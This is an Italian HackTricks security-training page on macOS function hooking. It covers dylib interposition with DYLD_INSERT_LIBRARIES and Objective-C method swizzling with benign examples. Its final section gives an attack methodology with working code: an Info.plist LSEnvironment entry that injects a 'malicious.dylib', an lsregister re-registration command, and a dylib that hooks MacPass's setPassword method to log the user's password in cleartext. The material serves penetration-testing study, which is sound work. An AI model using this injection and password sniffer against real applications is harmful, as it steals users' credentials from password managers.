# Hooking delle Funzioni su macOS

{% hint style="success" %}
Impara e pratica l'Hacking su AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Impara e pratica l'Hacking su GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Supporta HackTricks</summary>

* Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Condividi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Interposizione delle Funzioni

Crea una **dylib** con una sezione **`__interpose` (`__DATA___interpose`)** (o una sezione contrassegnata con **`S_INTERPOSING`**) contenente tuple di **puntatori a funzioni** che si riferiscono alle funzioni **originali** e di **sostituzione**.

Successivamente, **inietta** la dylib con **`DYLD_INSERT_LIBRARIES`** (l'interposizione deve avvenire prima del caricamento dell'applicazione principale). Ovviamente le [**restrizioni** applicate all'uso di **`DYLD_INSERT_LIBRARIES`** si applicano anche qui](macos-library-injection/#check-restrictions).

### Interposizione di printf

{% tabs %}
{% tab title="interpose.c" %}
{% code title="interpose.c" overflow="wrap" %}
```c
// gcc -dynamiclib interpose.c -o interpose.dylib
#include <stdio.h>
#include <stdarg.h>

int my_printf(const char *format, ...) {
//va_list args;
//va_start(args, format);
//int ret = vprintf(format, args);
//va_end(args);

int ret = printf("Hello from interpose\n");
return ret;
}

__attribute__((used)) static struct { const void *replacement; const void *replacee; } _interpose_printf
__attribute__ ((section ("__DATA,__interpose"))) = { (const void *)(unsigned long)&my_printf, (const void *)(unsigned long)&printf };
```
{% endcode %}
{% endtab %}

{% tab title="hello.c" %}
```c
//gcc hello.c -o hello
#include <stdio.h>

int main() {
printf("Hello World!\n");
return 0;
}
```
{% endtab %}

{% tab title="interpose2.c" %}
{% code overflow="wrap" %}
```c
// Just another way to define an interpose
// gcc -dynamiclib interpose2.c -o interpose2.dylib

#include <stdio.h>

#define DYLD_INTERPOSE(_replacement, _replacee) \
__attribute__((used)) static struct { \
const void* replacement; \
const void* replacee; \
} _interpose_##_replacee __attribute__ ((section("__DATA, __interpose"))) = { \
(const void*) (unsigned long) &_replacement, \
(const void*) (unsigned long) &_replacee \
};

int my_printf(const char *format, ...)
{
int ret = printf("Hello from interpose\n");
return ret;
}

DYLD_INTERPOSE(my_printf,printf);
```
{% endcode %}
{% endtab %}
{% endtabs %}
```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./hello
Hello from interpose

DYLD_INSERT_LIBRARIES=./interpose2.dylib ./hello
Hello from interpose
```
{% hint style="warning" %}
La variabile di ambiente **`DYLD_PRINT_INTERPOSTING`** può essere utilizzata per il debug dell'interposizione e stamperà il processo di interposizione.
{% endhint %}

Inoltre, nota che **l'interposizione avviene tra il processo e le librerie caricate**, non funziona con la cache delle librerie condivise.

### Interposizione Dinamica

Ora è anche possibile interporre una funzione dinamicamente utilizzando la funzione **`dyld_dynamic_interpose`**. Questo permette di interporre programmaticamente una funzione durante l'esecuzione anziché farlo solo dall'inizio.

È sufficiente indicare le **coppie** della **funzione da sostituire e della funzione di sostituzione**.
```c
struct dyld_interpose_tuple {
const void* replacement;
const void* replacee;
};
extern void dyld_dynamic_interpose(const struct mach_header* mh,
const struct dyld_interpose_tuple array[], size_t count);
```
## Metodo Swizzling

In ObjectiveC è così che viene chiamato un metodo: **`[istanzaMiaClasse nomeDelMetodoPrimoParam:param1 secondoParam:param2]`**

È necessario l'**oggetto**, il **metodo** e i **parametri**. E quando un metodo viene chiamato viene inviato un **messaggio** utilizzando la funzione **`objc_msgSend`**: `int i = ((int (*)(id, SEL, NSString *, NSString *))objc_msgSend)(someObject, @selector(method1p1:p2:), value1, value2);`

L'oggetto è **`someObject`**, il metodo è **`@selector(method1p1:p2:)`** e gli argomenti sono **value1**, **value2**.

Seguendo le strutture dell'oggetto, è possibile raggiungere un **array di metodi** dove sono **posizionati** i **nomi** e i **puntatori** al codice del metodo.

{% hint style="danger" %}
Nota che poiché i metodi e le classi sono accessibili in base ai loro nomi, queste informazioni sono memorizzate nel binario, quindi è possibile recuperarle con `otool -ov </percorso/bin>` o [`class-dump </percorso/bin>`](https://github.com/nygard/class-dump)
{% endhint %}

### Accesso ai metodi grezzi

È possibile accedere alle informazioni dei metodi come il nome, il numero di parametri o l'indirizzo come nell'esempio seguente:

{% code overflow="wrap" %}
```objectivec
// gcc -framework Foundation test.m -o test

#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

int main() {
// Get class of the variable
NSString* str = @"This is an example";
Class strClass = [str class];
NSLog(@"str's Class name: %s", class_getName(strClass));

// Get parent class of a class
Class strSuper = class_getSuperclass(strClass);
NSLog(@"Superclass name: %@",NSStringFromClass(strSuper));

// Get information about a method
SEL sel = @selector(length);
NSLog(@"Selector name: %@", NSStringFromSelector(sel));
Method m = class_getInstanceMethod(strClass,sel);
NSLog(@"Number of arguments: %d", method_getNumberOfArguments(m));
NSLog(@"Implementation address: 0x%lx", (unsigned long)method_getImplementation(m));

// Iterate through the class hierarchy
NSLog(@"Listing methods:");
Class currentClass = strClass;
while (currentClass != NULL) {
unsigned int inheritedMethodCount = 0;
Method* inheritedMethods = class_copyMethodList(currentClass, &inheritedMethodCount);

NSLog(@"Number of inherited methods in %s: %u", class_getName(currentClass), inheritedMethodCount);

for (unsigned int i = 0; i < inheritedMethodCount; i++) {
Method method = inheritedMethods[i];
SEL selector = method_getName(method);
const char* methodName = sel_getName(selector);
unsigned long address = (unsigned long)method_getImplementation(m);
NSLog(@"Inherited method name: %s (0x%lx)", methodName, address);
}

// Free the memory allocated by class_copyMethodList
free(inheritedMethods);
currentClass = class_getSuperclass(currentClass);
}

// Other ways to call uppercaseString method
if([str respondsToSelector:@selector(uppercaseString)]) {
NSString *uppercaseString = [str performSelector:@selector(uppercaseString)];
NSLog(@"Uppercase string: %@", uppercaseString);
}

// Using objc_msgSend directly
NSString *uppercaseString2 = ((NSString *(*)(id, SEL))objc_msgSend)(str, @selector(uppercaseString));
NSLog(@"Uppercase string: %@", uppercaseString2);

// Calling the address directly
IMP imp = method_getImplementation(class_getInstanceMethod(strClass, @selector(uppercaseString))); // Get the function address
NSString *(*callImp)(id,SEL) = (typeof(callImp))imp; // Generates a function capable to method from imp
NSString *uppercaseString3 = callImp(str,@selector(uppercaseString)); // Call the method
NSLog(@"Uppercase string: %@", uppercaseString3);

return 0;
}
```
{% endcode %}

### Method Swizzling con method\_exchangeImplementations

La funzione **`method_exchangeImplementations`** permette di **cambiare** l'**indirizzo** dell'**implementazione** di **una funzione con un'altra**.

{% hint style="danger" %}
Quindi quando una funzione viene chiamata, viene **eseguita l'altra**.
{% endhint %}

{% code overflow="wrap" %}
```objectivec
//gcc -framework Foundation swizzle_str.m -o swizzle_str

#import <Foundation/Foundation.h>
#import <objc/runtime.h>


// Create a new category for NSString with the method to execute
@interface NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original method
return [self swizzledSubstringFromIndex:from];
}

@end

int main(int argc, const char * argv[]) {
// Perform method swizzling
Method originalMethod = class_getInstanceMethod([NSString class], @selector(substringFromIndex:));
Method swizzledMethod = class_getInstanceMethod([NSString class], @selector(swizzledSubstringFromIndex:));
method_exchangeImplementations(originalMethod, swizzledMethod);

// We changed the address of one method for the other
// Now when the method substringFromIndex is called, what is really called is swizzledSubstringFromIndex
// And when swizzledSubstringFromIndex is called, substringFromIndex is really colled

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

return 0;
}
```
{% endcode %}

{% hint style="warning" %}
In questo caso, se l'**implementazione del codice del metodo legittimo** verifica il **nome del metodo**, potrebbe **rilevare** questo swizzling e impedirne l'esecuzione.

La seguente tecnica non ha questa restrizione.
{% endhint %}

### Method Swizzling con method\_setImplementation

Il formato precedente è strano perché stai cambiando l'implementazione di 2 metodi l'uno con l'altro. Utilizzando la funzione **`method_setImplementation`** puoi **cambiare** l'**implementazione** di un **metodo con un altro**.

Ricorda semplicemente di **memorizzare l'indirizzo dell'implementazione di quello originale** se stai per chiamarlo dalla nuova implementazione prima di sovrascriverlo, poiché in seguito sarà molto più complicato individuare quell'indirizzo.

{% code overflow="wrap" %}
```objectivec
#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

static IMP original_substringFromIndex = NULL;

@interface NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original implementation using objc_msgSendSuper
return ((NSString *(*)(id, SEL, NSUInteger))original_substringFromIndex)(self, _cmd, from);
}

@end

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Get the class of the target method
Class stringClass = [NSString class];

// Get the swizzled and original methods
Method originalMethod = class_getInstanceMethod(stringClass, @selector(substringFromIndex:));

// Get the function pointer to the swizzled method's implementation
IMP swizzledIMP = method_getImplementation(class_getInstanceMethod(stringClass, @selector(swizzledSubstringFromIndex:)));

// Swap the implementations
// It return the now overwritten implementation of the original method to store it
original_substringFromIndex = method_setImplementation(originalMethod, swizzledIMP);

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

// Set the original implementation back
method_setImplementation(originalMethod, original_substringFromIndex);

return 0;
}
}
```
{% endcode %}

## Metodologia dell'Attacco di Hooking

In questa pagina sono state discusse diverse modalità per agganciare le funzioni. Tuttavia, coinvolgevano **l'esecuzione di codice all'interno del processo per attaccare**.

Per fare ciò, la tecnica più semplice da utilizzare è iniettare un [Dyld tramite variabili d'ambiente o dirottamento](macos-library-injection/macos-dyld-hijacking-and-dyld\_insert\_libraries.md). Tuttavia, suppongo che questo potrebbe essere fatto anche tramite [iniezione di processo Dylib](macos-ipc-inter-process-communication/#dylib-process-injection-via-task-port).

Tuttavia, entrambe le opzioni sono **limitate** a **binari/processi non protetti**. Controlla ciascuna tecnica per saperne di più sulle limitazioni.

Tuttavia, un attacco di hooking di funzioni è molto specifico, un attaccante lo farebbe per **rubare informazioni sensibili da dentro un processo** (altrimenti si farebbe semplicemente un attacco di iniezione di processo). E queste informazioni sensibili potrebbero trovarsi in App scaricate dall'utente come MacPass.

Quindi il vettore dell'attaccante sarebbe quello di trovare una vulnerabilità o rimuovere la firma dell'applicazione, iniettare la variabile d'ambiente **`DYLD_INSERT_LIBRARIES`** attraverso l'Info.plist dell'applicazione aggiungendo qualcosa del genere:
```xml
<key>LSEnvironment</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/Applications/Application.app/Contents/malicious.dylib</string>
</dict>
```
e poi **ri-registrare** l'applicazione:

{% code overflow="wrap" %}
```bash
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -f /Applications/Application.app
```
{% endcode %}

Aggiungi a quella libreria il codice di hooking per esfiltrare le informazioni: Password, messaggi...

{% hint style="danger" %}
Nota che nelle versioni più recenti di macOS se **rimuovi la firma** del binario dell'applicazione e questa è stata eseguita in precedenza, macOS **non eseguirà più l'applicazione**.
{% endhint %}

#### Esempio di libreria

{% code overflow="wrap" %}
```objectivec
// gcc -dynamiclib -framework Foundation sniff.m -o sniff.dylib

// If you added env vars in the Info.plist don't forget to call lsregister as explained before

// Listen to the logs with something like:
// log stream --style syslog --predicate 'eventMessage CONTAINS[c] "Password"'

#include <Foundation/Foundation.h>
#import <objc/runtime.h>

// Here will be stored the real method (setPassword in this case) address
static IMP real_setPassword = NULL;

static BOOL custom_setPassword(id self, SEL _cmd, NSString* password, NSURL* keyFileURL)
{
// Function that will log the password and call the original setPassword(pass, file_path) method
NSLog(@"[+] Password is: %@", password);

// After logging the password call the original method so nothing breaks.
return ((BOOL (*)(id,SEL,NSString*, NSURL*))real_setPassword)(self, _cmd,  password, keyFileURL);
}

// Library constructor to execute
__attribute__((constructor))
static void customConstructor(int argc, const char **argv) {
// Get the real method address to not lose it
Class classMPDocument = NSClassFromString(@"MPDocument");
Method real_Method = class_getInstanceMethod(classMPDocument, @selector(setPassword:keyFileURL:));

// Make the original method setPassword call the fake implementation one
IMP fake_IMP = (IMP)custom_setPassword;
real_setPassword = method_setImplementation(real_Method, fake_IMP);
}
```
{% endcode %}

## Riferimenti

* [https://nshipster.com/method-swizzling/](https://nshipster.com/method-swizzling/)

{% hint style="success" %}
Impara e pratica l'Hacking su AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Impara e pratica l'Hacking su GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Sostieni HackTricks</summary>

* Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Condividi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repository di Github.

</details>
{% endhint %}
